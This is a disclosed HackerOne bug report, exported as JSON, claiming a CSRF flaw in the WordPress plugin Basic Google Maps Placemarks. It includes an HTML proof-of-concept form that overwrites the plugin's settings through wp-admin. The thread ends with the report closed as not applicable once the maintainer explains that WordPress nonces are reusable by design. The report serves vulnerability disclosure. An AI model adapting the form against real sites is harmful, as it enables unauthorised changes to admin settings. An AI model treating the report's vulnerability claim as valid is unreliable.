{"id":153580,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTM1ODA=","url":"https://hackerone.com/reports/153580","title":"CSRF in changing settings of Basic Google Maps Placemarks","state":"Closed","substate":"not-applicable","readable_substate":"N/A","created_at":"2016-07-24T20:32:24.114Z","submitted_at":"2016-07-24T20:32:24.114Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ahsan","url":"/ahsan","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":162,"url":"https://hackerone.com/iandunn-projects","handle":"iandunn-projects","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/162/2b148a5580e8f7c45d676df7576fb8b11b4de9ad_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/162/2b148a5580e8f7c45d676df7576fb8b11b4de9ad_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ian Dunn","twitter_handle":"","website":"","about":"I'm a WordPress developer who maintains several small open source projects."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-07-25T14:27:17.426Z","bug_reporter_agreed_on_going_public_at":"2016-07-25T14:27:17.358Z","team_member_agreed_on_going_public_at":"2016-07-25T14:23:10.676Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey, this is Ahsan Tahir! \n\nI was just pentesting Basic Google Maps Placemarks in Wordpress, I found a CSRF (Cross-Site Request Forgery) So, by exploiting this CSRF issue, an attacker can edit the settings (e.g Map Width, Map Height, Map Center Address etc..) \n\n#PoC \nThere is not CSRF token/Authentication token when changing settings of Basic Google Maps Placemarks (http://localhost/wordpress/wp-admin/options-general.php?page=bgmp_settings)\n\nSo, we can exploit it with the following code:\n\n##Exploit Code\n```\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"http://localhost/wordpress/wp-admin/options.php\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"option\u0026#95;page\" value=\"bgmp\u0026#95;settings\" /\u003e\n      \u003cinput type=\"hidden\" name=\"action\" value=\"update\" /\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;wpnonce\" value=\"a9ef057ff9\" /\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;wp\u0026#95;http\u0026#95;referer\" value=\"\u0026#47;wordpress\u0026#47;wp\u0026#45;admin\u0026#47;options\u0026#45;general\u0026#46;php\u0026#63;page\u0026#61;bgmp\u0026#95;settings\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;width\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;height\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;address\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;zoom\" value=\"7\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;type\" value=\"ROADMAP\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;type\u0026#45;control\" value=\"off\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;navigation\u0026#45;control\" value=\"DEFAULT\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;map\u0026#45;info\u0026#45;window\u0026#45;width\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;cluster\u0026#45;max\u0026#45;zoom\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;cluster\u0026#45;grid\u0026#45;size\" value=\"testing\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bgmp\u0026#95;cluster\u0026#45;style\" value=\"default\" /\u003e\n      \u003cinput type=\"hidden\" name=\"submit\" value=\"Save\u0026#32;Changes\" /\u003e\n      \u003cinput type=\"hidden\" name=\"closedpostboxesnonce\" value=\"faa425ff22\" /\u003e\n      \u003cinput type=\"hidden\" name=\"\u0026#95;wp\u0026#95;http\u0026#95;referer\" value=\"\u0026#47;wordpress\u0026#47;wp\u0026#45;admin\u0026#47;options\u0026#45;general\u0026#46;php\u0026#63;page\u0026#61;bgmp\u0026#95;settings\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nIf you run above HTML code in your browser, when you are logged in to your wordpress, and click on submit request, *every* value of http://localhost/wordpress/wp-admin/options-general.php?page=bgmp_settings will be set to \"testing\" \n\nThis one is a small, but effective CSRF; effective because if anyone tricks the admin into clicking the button, or even visiting the page (JavaScript is used in that type of exploit code!) The settings will be changed automatically!\n\n###How to Fix?\nThe fix is simple, add a CSRF token in the request/form for editing the settings of Basic Google Maps Placemarks! \n\nHoping for your positive response! âœŒ\n\nIf you have any other questions or if anything needs clarification, please let me know.\n\nCheers,\nAhsan","vulnerability_information_html":"\u003cp\u003eHey, this is Ahsan Tahir! \u003c/p\u003e\n\n\u003cp\u003eI was just pentesting Basic Google Maps Placemarks in Wordpress, I found a CSRF (Cross-Site Request Forgery) So, by exploiting this CSRF issue, an attacker can edit the settings (e.g Map Width, Map Height, Map Center Address etc..) \u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePoC\u003c/h1\u003e\n\n\u003cp\u003eThere is not CSRF token/Authentication token when changing settings of Basic Google Maps Placemarks (\u003ca title=\"http://localhost/wordpress/wp-admin/options-general.php?page=bgmp_settings\" href=\"/redirect?url=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Dbgmp_settings\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://localhost/wordpress/wp-admin/options-general.php?page=bgmp_settings\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003cp\u003eSo, we can exploit it with the following code:\u003c/p\u003e\n\n\u003ch2 id=\"exploit-code\"\u003eExploit Code\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://localhost/wordpress/wp-admin/options.php\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;option\u0026amp;#95;page\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;settings\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;action\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;update\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;#95;wpnonce\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;a9ef057ff9\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;#95;wp\u0026amp;#95;http\u0026amp;#95;referer\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;#47;wordpress\u0026amp;#47;wp\u0026amp;#45;admin\u0026amp;#47;options\u0026amp;#45;general\u0026amp;#46;php\u0026amp;#63;page\u0026amp;#61;bgmp\u0026amp;#95;settings\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;map\u0026amp;#45;width\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;testing\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;map\u0026amp;#45;height\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;testing\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;map\u0026amp;#45;address\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;testing\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;map\u0026amp;#45;zoom\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;7\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;map\u0026amp;#45;type\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;ROADMAP\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;map\u0026amp;#45;type\u0026amp;#45;control\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;off\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;map\u0026amp;#45;navigation\u0026amp;#45;control\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;DEFAULT\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;map\u0026amp;#45;info\u0026amp;#45;window\u0026amp;#45;width\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;testing\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;cluster\u0026amp;#45;max\u0026amp;#45;zoom\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;testing\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;cluster\u0026amp;#45;grid\u0026amp;#45;size\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;testing\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bgmp\u0026amp;#95;cluster\u0026amp;#45;style\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;default\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Save\u0026amp;#32;Changes\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;closedpostboxesnonce\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;faa425ff22\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;#95;wp\u0026amp;#95;http\u0026amp;#95;referer\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026amp;#47;wordpress\u0026amp;#47;wp\u0026amp;#45;admin\u0026amp;#47;options\u0026amp;#45;general\u0026amp;#46;php\u0026amp;#63;page\u0026amp;#61;bgmp\u0026amp;#95;settings\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf you run above HTML code in your browser, when you are logged in to your wordpress, and click on submit request, \u003cem\u003eevery\u003c/em\u003e value of \u003ca title=\"http://localhost/wordpress/wp-admin/options-general.php?page=bgmp_settings\" href=\"/redirect?url=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Foptions-general.php%3Fpage%3Dbgmp_settings\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://localhost/wordpress/wp-admin/options-general.php?page=bgmp_settings\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e will be set to \u0026quot;testing\u0026quot; \u003c/p\u003e\n\n\u003cp\u003eThis one is a small, but effective CSRF; effective because if anyone tricks the admin into clicking the button, or even visiting the page (JavaScript is used in that type of exploit code!) The settings will be changed automatically!\u003c/p\u003e\n\n\u003ch3 id=\"how-to-fix\"\u003eHow to Fix?\u003c/h3\u003e\n\n\u003cp\u003eThe fix is simple, add a CSRF token in the request/form for editing the settings of Basic Google Maps Placemarks! \u003c/p\u003e\n\n\u003cp\u003eHoping for your positive response! âœŒ\u003c/p\u003e\n\n\u003cp\u003eIf you have any other questions or if anything needs clarification, please let me know.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nAhsan\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":4,"voters":["spetr0x","dyabla","scout","louislane"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1084788,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"P.S: If you are not going to accept this CSRF, please close as informative! :)","markdown_message":"\u003cp\u003eP.S: If you are not going to accept this CSRF, please close as informative! :)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-24T20:49:07.593Z","updated_at":"2016-07-24T20:49:07.593Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1084796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The main concept in this is: \"wpnonce\" token is reuse able!","markdown_message":"\u003cp\u003eThe main concept in this is: \u0026quot;wpnonce\u0026quot; token is reuse able!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-24T20:51:33.826Z","updated_at":"2016-07-24T20:51:33.826Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1084836,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Ahsan, [WordPress nonces are not intended to be true nonces](https://codex.wordpress.org/WordPress_Nonces); they're supposed to be reusable for 12-24 hours.\n\nIs that the only problem, or would there still be a vulnerability even if `wpnonce` wasn't reusable?","markdown_message":"\u003cp\u003eHi Ahsan, \u003ca href=\"/redirect?url=https%3A%2F%2Fcodex.wordpress.org%2FWordPress_Nonces\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eWordPress nonces are not intended to be true nonces\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e; they\u0026#39;re supposed to be reusable for 12-24 hours.\u003c/p\u003e\n\n\u003cp\u003eIs that the only problem, or would there still be a vulnerability even if \u003ccode\u003ewpnonce\u003c/code\u003e wasn\u0026#39;t reusable?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-24T22:17:48.844Z","updated_at":"2016-07-24T22:17:48.844Z","actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1085099,"is_internal":false,"editable":false,"type":"Activities::BugNotApplicable","message":"My mistake! :)","markdown_message":"\u003cp\u003eMy mistake! :)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-25T06:33:09.964Z","updated_at":"2016-07-25T06:33:09.964Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1085796,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"No worries :)\n\nWould you mind disclosing this? That'll help me avoid duplicate reports in the future.","markdown_message":"\u003cp\u003eNo worries :)\u003c/p\u003e\n\n\u003cp\u003eWould you mind disclosing this? That\u0026#39;ll help me avoid duplicate reports in the future.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-25T14:23:10.704Z","updated_at":"2016-07-25T14:23:10.704Z","first_to_agree":true,"actor":{"username":"iandunn","cleared":false,"url":"/iandunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/974/01bc1d097002b7eff8eddba98990e094553b1eac_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1085812,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Sure thing. :)","markdown_message":"\u003cp\u003eSure thing. :)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-25T14:27:17.388Z","updated_at":"2016-07-25T14:27:17.388Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1085813,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-25T14:27:17.454Z","updated_at":"2016-07-25T14:27:17.454Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"iandunn-projects","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}